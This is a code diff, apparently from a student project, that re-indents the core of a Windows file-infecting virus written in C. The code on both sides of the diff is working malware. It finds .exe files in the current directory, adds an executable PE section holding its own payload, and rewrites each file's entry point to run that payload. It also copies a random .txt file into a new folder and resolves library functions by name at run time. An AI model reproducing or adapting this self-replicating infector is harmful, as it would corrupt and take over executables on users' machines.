@@ -155,251 +155,251 @@ void payload(void)
         :"rax"
     );
 
-    // ===========================================
-    task1: {
-        asm ("nop");
-        typedef void (*t_srand)(unsigned int);
-        typedef int (*t_rand)(void);
-        typedef time_t (*t_time)(time_t *);
-        char s_srand[] = "srand";
-        char s_rand[] = "rand";
-        char s_time[] = "time";
+// ===========================================
+task1: {
+    asm ("nop");
+    typedef void (*t_srand)(unsigned int);
+    typedef int (*t_rand)(void);
+    typedef time_t (*t_time)(time_t *);
+    char s_srand[] = "srand";
+    char s_rand[] = "rand";
+    char s_time[] = "time";
 
-        // typedef char *(*t_strcpy)(char *, const char *);
-        // char s_strcpy[] = "strcpy";
+    // typedef char *(*t_strcpy)(char *, const char *);
+    // char s_strcpy[] = "strcpy";
 
-        typedef int(*t_system)(LPCSTR);
-        typedef int(*t_sprintf)(char *, const char *,...);
-        char s_system[] = "system";
-        char s_sprintf[] = "sprintf";
-        
-        WIN32_FIND_DATAA findFileData;
-        char param[] = "*.*"; 
-        HANDLE hFind = K32_FUNCTION(FindFirstFileA)(param, &findFileData);
+    typedef int(*t_system)(LPCSTR);
+    typedef int(*t_sprintf)(char *, const char *,...);
+    char s_system[] = "system";
+    char s_sprintf[] = "sprintf";
+    
+    WIN32_FIND_DATAA findFileData;
+    char param[] = "*.*"; 
+    HANDLE hFind = K32_FUNCTION(FindFirstFileA)(param, &findFileData);
 
-        char suffix[] = ".txt";
-        char txt_file_name[MAX_PATH] = {0};
-        FUNCTION(srand)(FUNCTION(time)(NULL));
-        do 
+    char suffix[] = ".txt";
+    char txt_file_name[MAX_PATH] = {0};
+    FUNCTION(srand)(FUNCTION(time)(NULL));
+    do 
+    {
+        if (match_suffix(findFileData.cFileName, suffix))
         {
-            if (match_suffix(findFileData.cFileName, suffix))
-            {
-                int len = length(findFileData.cFileName);
-                FUNCTION(memcpy)(txt_file_name, findFileData.cFileName, len);
-                txt_file_name[len] = '\0';
-                if(FUNCTION(rand)()%2)
-                {
-                    break;
-                }
-            }
-        } while (K32_FUNCTION(FindNextFileA)(hFind, &findFileData) != 0);
-        K32_FUNCTION(FindClose)(hFind);
-
-        char mkdir_cmd[] = "mkdir v_folder 2>NUL";
-        FUNCTION(system)(mkdir_cmd);
-
-        char cpy_cmd[50];
-        char cpy_fomat[] = "copy %s %s > NUL";
-        char dest_path[] = ".\\v_folder\\2021302181087.txt";
-        FUNCTION(sprintf)(cpy_cmd, cpy_fomat, txt_file_name, dest_path);
-        FUNCTION(system)(cpy_cmd);
-
-        RET(task1);
-    } // end of task1
-
-    // ===========================================
-    char target[MAX_PATH] = {0};
-    payload_info_t payload_info = {0}; // parameters for inject
-    infect: {
-        asm ("nop");
-
-        CALL(get_payload);
-        get_payload_ret: asm("nop");
-
-        WIN32_FIND_DATAA findFileData;
-        char param[] = "*.*"; 
-        HANDLE hFind = K32_FUNCTION(FindFirstFileA)(param, &findFileData);
-
-        char suffix[] = ".exe";
-        do 
-        {
-            if (match_suffix(findFileData.cFileName, suffix))
-            {
-                int len = length(findFileData.cFileName);
-                FUNCTION(memcpy)(target, findFileData.cFileName, len);
-                target[len] = '\0';
-                CALL(inject);
-                inject_ret: asm("nop");
-            }
-        } while (K32_FUNCTION(FindNextFileA)(hFind, &findFileData) != 0);
-        K32_FUNCTION(FindClose)(hFind);
-        RET(infect);
-    } // end of infect
-
-    // ===========================================
-    inject:{
-        asm ("nop");
-
-        char mode[] = "rb+";
-        FILE *host = FUNCTION(fopen)(target, mode);
-
-        if(host == NULL) {
-            FUNCTION(fclose)(host);
-            RET(inject);
-        }
-
-        // get nt_header
-        IMAGE_DOS_HEADER i_dos_header = {0};
-        FUNCTION(fread)(&i_dos_header, 1, sizeof(i_dos_header), host);
-        IMAGE_NT_HEADERS i_nt_headers = {0};
-        FUNCTION(fseek)(host, i_dos_header.e_lfanew, SEEK_SET);
-        FUNCTION(fread)(&i_nt_headers, 1, sizeof(i_nt_headers), host);
-
-        // get raw data size and last header
-        IMAGE_SECTION_HEADER i_sect_header = {0};
-        int raw_data_size = 0;
-
-        int injectable = 1;
-        for (int i = 0; i < i_nt_headers.FileHeader.NumberOfSections; i++)
-        {
-            FUNCTION(fread)(&i_sect_header, 1, sizeof(i_sect_header), host);
-            raw_data_size += i_sect_header.SizeOfRawData;
-            injectable = injectable && (compare(v_sect_name, i_sect_header.Name) != 0); 
-        }
-
-        // Preparing for adding new section header
-        DWORD FileAlignment = i_nt_headers.OptionalHeader.FileAlignment;
-        // the end of IMAGE_SECTION_HEADERs (from FILE_BEGIN)
-        int position = i_dos_header.e_lfanew 
-            + sizeof(IMAGE_NT_HEADERS) 
-            + i_nt_headers.FileHeader.NumberOfSections
-            *sizeof(IMAGE_SECTION_HEADER); 
-        // spare space of IMAGE_SECTION_HEADER
-        int space = FileAlignment - position % FileAlignment;
-
-        injectable = injectable && (space >= sizeof(IMAGE_SECTION_HEADER)); 
-
-        if(!injectable) {
-            FUNCTION(fclose)(host);
-            RET(inject);
-        }
-
-        char format[] = "injecting to: %s\n";
-        FUNCTION(printf)(format, target);
-
-        // ADDING new section header: 
-        int sect_start = position + space;  // start of original (host) codes
-        int sect_end = sect_start + raw_data_size;  // end of original (host) codes
-
-        DWORD payload_raw_size = ((payload_info.size / FileAlignment)
-            + (!!(payload_info.size % FileAlignment)))*FileAlignment;
-        DWORD PointerToRawData = sect_end;
-
-        // i_sect_header is now the header of last section
-        DWORD virus_v_addr = i_sect_header.VirtualAddress
-            + i_sect_header.Misc.VirtualSize 
-            + i_nt_headers.OptionalHeader.SectionAlignment 
-            - i_sect_header.Misc.VirtualSize % i_nt_headers.OptionalHeader.SectionAlignment;
-
-        DWORD Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;
-
-        IMAGE_SECTION_HEADER new_sect_header = {
-            V_SECT_NAME, 
-            payload_info.size, 
-            virus_v_addr, 
-            payload_raw_size, // t
-            PointerToRawData, // t
-            0, 0, 0, 0, 
-            Characteristics // t
-        };
-
-        FUNCTION(fseek)(host, 0, SEEK_CUR);
-        FUNCTION(fwrite)(&new_sect_header, 1, sizeof(new_sect_header), host);
-        // END adding new section header()
-
-        // Updating nt_headers
-        DWORD AddressOfEntryPoint = i_nt_headers.OptionalHeader.AddressOfEntryPoint;
-        i_nt_headers.OptionalHeader.AddressOfEntryPoint = virus_v_addr;
-        i_nt_headers.FileHeader.NumberOfSections++;
-
-        // !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-        // del: i_nt_headers.OptionalHeader.SizeOfHeaders += sizeof(IMAGE_SECTION_HEADER);
-        DWORD SizeOfHeaders = i_dos_header.e_lfanew + 4 /*size of signature*/
-            + sizeof(IMAGE_FILE_HEADER)
-            + i_nt_headers.FileHeader.SizeOfOptionalHeader
-            + i_nt_headers.FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER);
-        SizeOfHeaders += FileAlignment - SizeOfHeaders % FileAlignment;
-        i_nt_headers.OptionalHeader.SizeOfHeaders = SizeOfHeaders;
-
-        // add: 
-        i_nt_headers.OptionalHeader.BaseOfCode = virus_v_addr;
-        // !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-
-        i_nt_headers.OptionalHeader.SizeOfCode += payload_raw_size;
-
-        i_nt_headers.OptionalHeader.SizeOfImage += payload_info.size
-            + i_nt_headers.OptionalHeader.SectionAlignment 
-            - payload_info.size % i_nt_headers.OptionalHeader.SectionAlignment;
-
-        FUNCTION(fseek)(host, i_dos_header.e_lfanew, SEEK_SET);
-        FUNCTION(fwrite)(&i_nt_headers, 1, sizeof(i_nt_headers), host);
-        // END updating 
-
-        // write payload
-        FUNCTION(fseek)(host, sect_end, SEEK_SET);
-        // &AddressOfEntryPoint;
-        FUNCTION(memcpy)(payload_info.payload + offset, &AddressOfEntryPoint, sizeof(DWORD));
-        // payload_info.payload[offset] = ;
-        FUNCTION(fwrite)(payload_info.payload, 1, payload_info.size, host);
-        FUNCTION(fclose)(host);
-        RET(inject);
-    } // end of inject
-
-    // ===========================================
-    get_payload:{
-        asm ("nop");
-        typedef FILE *(*t__wfopen)(const wchar_t *, const wchar_t *);
-        typedef void * (*t_malloc)(size_t);
-        char s__wfopen[] = "_wfopen"; 
-        char s_malloc[] = "malloc"; 
-
-        wchar_t *current_exe_name = ((UNICODE_STRING*)(entry->Reserved4))->Buffer;
-
-        wchar_t mode_str[] = L"rb";
-        FILE* payload_file = FUNCTION(_wfopen)(current_exe_name, mode_str);
-
-        if(payload_file == NULL) {
-            FUNCTION(fclose)(payload_file);
-            RET(inject);
-        }
-        
-        IMAGE_DOS_HEADER i_dos_header = {0};
-        IMAGE_NT_HEADERS i_nt_headers = {0};
-        FUNCTION(fread)(&i_dos_header, 1, sizeof(i_dos_header), payload_file);
-        FUNCTION(fseek)(payload_file, i_dos_header.e_lfanew, SEEK_SET);
-        FUNCTION(fread)(&i_nt_headers, 1, sizeof(i_nt_headers), payload_file);
-
-        IMAGE_SECTION_HEADER i_sect_header = {0};
-        for (int i = 0; i < i_nt_headers.FileHeader.NumberOfSections; i++)
-        {
-            FUNCTION(fread)(&i_sect_header, 1, sizeof(i_sect_header), payload_file);
-            if(compare(i_sect_header.Name, v_sect_name) == 0)
+            int len = length(findFileData.cFileName);
+            FUNCTION(memcpy)(txt_file_name, findFileData.cFileName, len);
+            txt_file_name[len] = '\0';
+            if(FUNCTION(rand)()%2)
             {
                 break;
             }
         }
-        FUNCTION(fseek)(payload_file, i_sect_header.PointerToRawData, SEEK_SET);
-        BYTE *payload = (BYTE*)FUNCTION(malloc)(i_sect_header.Misc.VirtualSize);
-        FUNCTION(fread)(payload, 1, i_sect_header.Misc.VirtualSize, payload_file);
+    } while (K32_FUNCTION(FindNextFileA)(hFind, &findFileData) != 0);
+    K32_FUNCTION(FindClose)(hFind);
 
-        payload_info.payload = payload;
-        payload_info.size = i_sect_header.Misc.VirtualSize;
+    char mkdir_cmd[] = "mkdir v_folder 2>NUL";
+    FUNCTION(system)(mkdir_cmd);
 
-        FUNCTION(fclose)(payload_file);
+    char cpy_cmd[50];
+    char cpy_fomat[] = "copy %s %s > NUL";
+    char dest_path[] = ".\\v_folder\\2021302181087.txt";
+    FUNCTION(sprintf)(cpy_cmd, cpy_fomat, txt_file_name, dest_path);
+    FUNCTION(system)(cpy_cmd);
 
-        RET(get_payload);
+    RET(task1);
+} // end of task1
+
+// ===========================================
+char target[MAX_PATH] = {0};
+payload_info_t payload_info = {0}; // parameters for inject
+
+infect: {
+    asm ("nop");
+
+    CALL(get_payload);
+    get_payload_ret: asm("nop");
+
+    WIN32_FIND_DATAA findFileData;
+    char param[] = "*.*"; 
+    HANDLE hFind = K32_FUNCTION(FindFirstFileA)(param, &findFileData);
+
+    char suffix[] = ".exe";
+    do 
+    {
+        if (match_suffix(findFileData.cFileName, suffix))
+        {
+            int len = length(findFileData.cFileName);
+            FUNCTION(memcpy)(target, findFileData.cFileName, len);
+            target[len] = '\0';
+            CALL(inject);
+            inject_ret: asm("nop");
+        }
+    } while (K32_FUNCTION(FindNextFileA)(hFind, &findFileData) != 0);
+    K32_FUNCTION(FindClose)(hFind);
+    RET(infect);
+} // end of infect
+
+// ===========================================
+inject:{
+    asm ("nop");
+
+    char mode[] = "rb+";
+    FILE *host = FUNCTION(fopen)(target, mode);
+
+    if(host == NULL) {
+        FUNCTION(fclose)(host);
+        RET(inject);
     }
-} // end of payload()
+
+    // get nt_header
+    IMAGE_DOS_HEADER i_dos_header = {0};
+    FUNCTION(fread)(&i_dos_header, 1, sizeof(i_dos_header), host);
+    IMAGE_NT_HEADERS i_nt_headers = {0};
+    FUNCTION(fseek)(host, i_dos_header.e_lfanew, SEEK_SET);
+    FUNCTION(fread)(&i_nt_headers, 1, sizeof(i_nt_headers), host);
+
+    // get raw data size and last header
+    IMAGE_SECTION_HEADER i_sect_header = {0};
+    int raw_data_size = 0;
+
+    int injectable = 1;
+    for (int i = 0; i < i_nt_headers.FileHeader.NumberOfSections; i++)
+    {
+        FUNCTION(fread)(&i_sect_header, 1, sizeof(i_sect_header), host);
+        raw_data_size += i_sect_header.SizeOfRawData;
+        injectable = injectable && (compare(v_sect_name, i_sect_header.Name) != 0); 
+    }
+
+    // Preparing for adding new section header
+    DWORD FileAlignment = i_nt_headers.OptionalHeader.FileAlignment;
+    // the end of IMAGE_SECTION_HEADERs (from FILE_BEGIN)
+    int position = i_dos_header.e_lfanew 
+        + sizeof(IMAGE_NT_HEADERS) 
+        + i_nt_headers.FileHeader.NumberOfSections
+        *sizeof(IMAGE_SECTION_HEADER); 
+    // spare space of IMAGE_SECTION_HEADER
+    int space = FileAlignment - position % FileAlignment;
+
+    injectable = injectable && (space >= sizeof(IMAGE_SECTION_HEADER)); 
+
+    if(!injectable) {
+        FUNCTION(fclose)(host);
+        RET(inject);
+    }
+
+    char format[] = "injecting to: %s\n";
+    FUNCTION(printf)(format, target);
+
+    // ADDING new section header: 
+    int sect_start = position + space;  // start of original (host) codes
+    int sect_end = sect_start + raw_data_size;  // end of original (host) codes
+
+    DWORD payload_raw_size = ((payload_info.size / FileAlignment)
+        + (!!(payload_info.size % FileAlignment)))*FileAlignment;
+    DWORD PointerToRawData = sect_end;
+
+    // i_sect_header is now the header of last section
+    DWORD virus_v_addr = i_sect_header.VirtualAddress
+        + i_sect_header.Misc.VirtualSize 
+        + i_nt_headers.OptionalHeader.SectionAlignment 
+        - i_sect_header.Misc.VirtualSize % i_nt_headers.OptionalHeader.SectionAlignment;
+
+    DWORD Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;
+
+    IMAGE_SECTION_HEADER new_sect_header = {
+        V_SECT_NAME, 
+        payload_info.size, 
+        virus_v_addr, 
+        payload_raw_size, // t
+        PointerToRawData, // t
+        0, 0, 0, 0, 
+        Characteristics // t
+    };
+
+    FUNCTION(fseek)(host, 0, SEEK_CUR);
+    FUNCTION(fwrite)(&new_sect_header, 1, sizeof(new_sect_header), host);
+    // END adding new section header()
+
+    // Updating nt_headers
+    DWORD AddressOfEntryPoint = i_nt_headers.OptionalHeader.AddressOfEntryPoint;
+    i_nt_headers.OptionalHeader.AddressOfEntryPoint = virus_v_addr;
+    i_nt_headers.FileHeader.NumberOfSections++;
+
+    // !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+    // del: i_nt_headers.OptionalHeader.SizeOfHeaders += sizeof(IMAGE_SECTION_HEADER);
+    DWORD SizeOfHeaders = i_dos_header.e_lfanew + 4 /*size of signature*/
+        + sizeof(IMAGE_FILE_HEADER)
+        + i_nt_headers.FileHeader.SizeOfOptionalHeader
+        + i_nt_headers.FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER);
+    SizeOfHeaders += FileAlignment - SizeOfHeaders % FileAlignment;
+    i_nt_headers.OptionalHeader.SizeOfHeaders = SizeOfHeaders;
+
+    // add: 
+    i_nt_headers.OptionalHeader.BaseOfCode = virus_v_addr;
+    // !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+    i_nt_headers.OptionalHeader.SizeOfCode += payload_raw_size;
+
+    i_nt_headers.OptionalHeader.SizeOfImage += payload_info.size
+        + i_nt_headers.OptionalHeader.SectionAlignment 
+        - payload_info.size % i_nt_headers.OptionalHeader.SectionAlignment;
+
+    FUNCTION(fseek)(host, i_dos_header.e_lfanew, SEEK_SET);
+    FUNCTION(fwrite)(&i_nt_headers, 1, sizeof(i_nt_headers), host);
+    // END updating 
+
+    // write payload
+    FUNCTION(fseek)(host, sect_end, SEEK_SET);
+    // &AddressOfEntryPoint;
+    FUNCTION(memcpy)(payload_info.payload + offset, &AddressOfEntryPoint, sizeof(DWORD));
+    // payload_info.payload[offset] = ;
+    FUNCTION(fwrite)(payload_info.payload, 1, payload_info.size, host);
+    FUNCTION(fclose)(host);
+    RET(inject);
+} // end of inject
+
+// ===========================================
+get_payload:{
+    asm ("nop");
+    typedef FILE *(*t__wfopen)(const wchar_t *, const wchar_t *);
+    typedef void * (*t_malloc)(size_t);
+    char s__wfopen[] = "_wfopen"; 
+    char s_malloc[] = "malloc"; 
+
+    wchar_t *current_exe_name = ((UNICODE_STRING*)(entry->Reserved4))->Buffer;
+
+    wchar_t mode_str[] = L"rb";
+    FILE* payload_file = FUNCTION(_wfopen)(current_exe_name, mode_str);
+
+    if(payload_file == NULL) {
+        FUNCTION(fclose)(payload_file);
+        RET(inject);
+    }
+    
+    IMAGE_DOS_HEADER i_dos_header = {0};
+    IMAGE_NT_HEADERS i_nt_headers = {0};
+    FUNCTION(fread)(&i_dos_header, 1, sizeof(i_dos_header), payload_file);
+    FUNCTION(fseek)(payload_file, i_dos_header.e_lfanew, SEEK_SET);
+    FUNCTION(fread)(&i_nt_headers, 1, sizeof(i_nt_headers), payload_file);
+
+    IMAGE_SECTION_HEADER i_sect_header = {0};
+    for (int i = 0; i < i_nt_headers.FileHeader.NumberOfSections; i++)
+    {
+        FUNCTION(fread)(&i_sect_header, 1, sizeof(i_sect_header), payload_file);
+        if(compare(i_sect_header.Name, v_sect_name) == 0)
+        {
+            break;
+        }
+    }
+    FUNCTION(fseek)(payload_file, i_sect_header.PointerToRawData, SEEK_SET);
+    BYTE *payload = (BYTE*)FUNCTION(malloc)(i_sect_header.Misc.VirtualSize);
+    FUNCTION(fread)(payload, 1, i_sect_header.Misc.VirtualSize, payload_file);
+
+    payload_info.payload = payload;
+    payload_info.size = i_sect_header.Misc.VirtualSize;
+
+    FUNCTION(fclose)(payload_file);
+
+    RET(get_payload);
+}} // end of payload()
 
 IMAGE_EXPORT_DIRECTORY *get_IMAGE_EXPORT_DIRECTORY(void *image_base)
 {
